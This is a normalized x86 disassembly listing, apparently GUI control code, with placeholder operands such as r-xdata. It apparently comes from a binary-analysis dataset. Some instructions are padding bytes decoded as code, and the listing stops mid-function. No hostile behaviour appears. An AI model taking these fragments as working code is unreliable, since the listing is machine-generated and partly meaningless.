xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_3ab1958
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_3ab1774
pop esi
pop ebx
retn
sub_3ab1981
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_3ab1774
pop esi
pop ebx
retn
sub_3ab19a9
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_3ab1774
pop esi
pop ebx
retn
sub_3ab19d9
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_3ab1774
pop esi
pop ebx
retn
sub_3ab1a01
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
movzx ecx [ ebp - 0x1 ]
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_3ab1a3c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_3ab0d44
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_3ac44a4
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd3
call sub_3a6457c
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
movzx eax [ esi + 0x4 ]
call sub_3ac44a4
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd3
call sub_3a6457c
sub_3ab1ab4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
movzx ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_3ab1aec
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
movzx eax [ esi + 0x4 ]
call sub_3ac44a4
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd2
call sub_3a6457c
sub_3ab1b24
push ebx
push esi
push edi
add esp 0xffffffe4
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_3aafdf0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_3ab1aec
add esp 0x1c
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
push [ esp + 0x8 ]
push [ esp + 0x8 ]
lea edx [ esp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x14 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_3a6457c
sub_3ab1ba8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_3ab1aec
pop esi
pop ebx
retn
sub_3ab1bc8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_3ab1aec
pop esi
pop ebx
retn
sub_3ab1be8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
movzx eax [ ebx + 0x4 ]
call sub_3ac44a4
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_3a6457c
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_3abd02c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab1c40
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_3aafde0
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_3aafdf0
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_3ab0e78
pop esi
retn
sub_3ab1c80
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0x94 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_3ab0eac
sub_3ab1d2e
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_3ab000c
mov cl 0x1
sub_3ab1d88
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x70 ]
je r-xdata
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x70 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x5a ] 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx 0xb00d
call sub_3ab0e78
sub_3ab1dc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5a ] 0x0
je r-xdata
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x70 ]
call sub_3ab1d88
pop ecx
push ebp
mov eax [ edx + 0x8 ]
call sub_3ab1d88
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x5a ] 0x1
sub_3ab1dfc
push esi
push edi
mov esi eax
cmp [ esi + 0x60 ] 0x0
je r-xdata
pop edi
pop esi
retn
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
mov [ esi + 0x60 ] 0x1
movzx edx [ edi + 0x5f ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x74 ]
sub_3ab1e20
push ebx
push esi
push edi
add esp 0xfffffff4
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x4 ]
push eax
movsx ecx [ ebx + 0x6 ]
movzx edx [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_3a6457c
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_3ab0e78
mov [ ebx + 0xc ] eax
sub_3ab1eb0
push ebx
mov ebx eax
cmp [ ebx + 0x8e ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
setne al
mov edx [ ebx + 0x30 ]
test [ edx + 0x1c ] 0x10
setne dl
cmp al dl
jne r-xdata
mov eax [ ebx + 0x30 ]
movzx edx [ eax + 0x8d ]
mov eax ebx
call sub_3aafcd8
mov [ ebx + 0x8e ] 0x1
sub_3ab1eec
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_3aafc7c
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_3aafc7c
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_3ab1f48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx 0xb013
call sub_3ab0e78
pop esi
pop ebx
retn
cmp [ ebx + 0x13a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_3ab1f84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx 0xb014
call sub_3ab0e78
pop esi
pop ebx
retn
cmp [ ebx + 0x132 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_3ab1fc8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_3a64258
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_3aaf244
mov edx [ esp ]
mov eax esi
call sub_3aaf210
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_3aaf514
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_3aaf558
sub_3ab204c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_3a78df4
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_3aaf610
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x4c ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_3a78e44
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_3aaf4c0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ab20d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x4c ]
mov eax [ ebp - 0x4 ]
call sub_3ab1fc8
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax ebx
call sub_3ab7c38
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0xc ] eax
push ebp
call sub_3ab204c
pop ecx
jmp r-xdata
sub_3ab2138
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_3ab2228
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab222f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_3a652c4
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_3aafbb8
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_3aafb88
cmp [ ebp - 0x4 ] 0x0
je r-xdata
movzx edx [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_3aafb88
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_3a656c8
jne r-xdata
lea eax [ esi + 0x84 ]
mov edx [ edi + 0x7c ]
call sub_3a652f4
cmp [ esi + 0x84 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x86 ]
mov eax esi
call sub_3aafaa8
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x110 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x114 ] eax
cmp [ esi + 0x112 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_3ab2238
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_3a6457c
sub_3ab2264
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3ab2284
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3ab22a4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3ab22c4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3ab22e4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3ab2304
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_3ab2324
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3a83acc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_3aaf08c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_3a6457c
sub_3ab235c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3ab23f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3a7abb4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_3ac0dfc
mov edx [ ebx + 0x84 ]
mov eax edi
call sub_3ac0f38
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3aafb88
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_3ac0c94
movzx edx [ ebx + 0x57 ]
mov eax edi
call sub_3ac1058
push [ ebx + 0x114 ]
push [ ebx + 0x110 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab2400
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3ab2408
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fwait
fnstsw ax
sahf
jae r-xdata
sub_3ab2444
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_3ab2408
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_3ab24f4
push ebx
mov ebx eax
cmp [ ebx + 0x94 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0x94 ]
call sub_3a6450c
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_3ab2528
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
sub_3ab2548
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax edi
mov si 0xffc7
call sub_3a6457c
test al al
je r-xdata
mov eax edi
call sub_3ab2588
or ebx eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax ebx
and eax 0x1
dec eax
je r-xdata
and ebx 0xfffffffd
jmp r-xdata
or ebx 0x2
sub_3ab25b4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x84 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_3ab25e4
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esp + 0x11 ] eax
movsx eax [ esp + 0x11 ]
mov [ esp + 0x15 ] eax
movsx eax [ esp + 0x13 ]
mov [ esp + 0x19 ] eax
mov eax [ esp + 0x15 ]
mov [ esp ] eax
mov eax [ esp + 0x19 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_3a78e6c
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_3aaf6c0
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x28 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x28 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_3a6457c
movzx eax [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_3a6457c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx edi
mov eax edi
call sub_3aaf6ec
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_3a78e6c
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x30 ]
xor edx edx
xor eax eax
call sub_3a78df4
lea edx [ esp + 0x30 ]
mov ecx esp
mov eax edi
call sub_3aaf610
sub_3ab2728
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x122 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
sub_3ab2768
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_3ab2868
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
add [ ebx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
add [ ebx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
test eax eax
je r-xdata
test eax eax
jne r-xdata
cmp esi eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab286f
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_3a652c4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ eax + 0x30 ]
mov edx [ eax + 0x40 ]
add [ ebx ] edx
mov edx [ eax + 0x44 ]
add [ ebx + 0x4 ] edx
sub_3ab2878
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab05e4
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab28b8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_3ab28b0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
and [ esi + 0x50 ] 0xffefffff
or [ esi + 0x50 ] 0x100000
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
sub_3ab28e8
test [ eax + 0x55 ] 0x40
jne r-xdata
retn
test [ eax + 0x1c ] 0x2
jne r-xdata
mov edx [ eax + 0x40 ]
mov [ eax + 0x180 ] edx
mov edx [ eax + 0x44 ]
mov [ eax + 0x184 ] edx
mov edx [ eax + 0x48 ]
mov [ eax + 0x188 ] edx
mov edx [ eax + 0x4c ]
